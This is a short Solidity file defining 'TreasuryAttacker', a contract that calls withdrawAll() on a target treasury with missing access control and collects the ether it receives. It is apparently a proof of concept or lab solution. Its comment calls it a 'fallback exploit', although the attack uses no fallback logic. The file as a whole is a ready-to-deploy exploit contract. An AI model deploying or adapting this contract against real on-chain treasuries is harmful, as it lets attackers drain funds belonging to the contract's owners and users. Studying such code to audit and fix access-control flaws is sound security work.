// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVulnerableTreasury {
    function withdrawAll() external;
}

/// @notice Fallback exploit for missing access control on withdrawAll().
contract TreasuryAttacker {
    IVulnerableTreasury public immutable treasury;

    constructor(address target) {
        treasury = IVulnerableTreasury(target);
    }

    function attack() external {
        treasury.withdrawAll();
    }

    receive() external payable {}
}
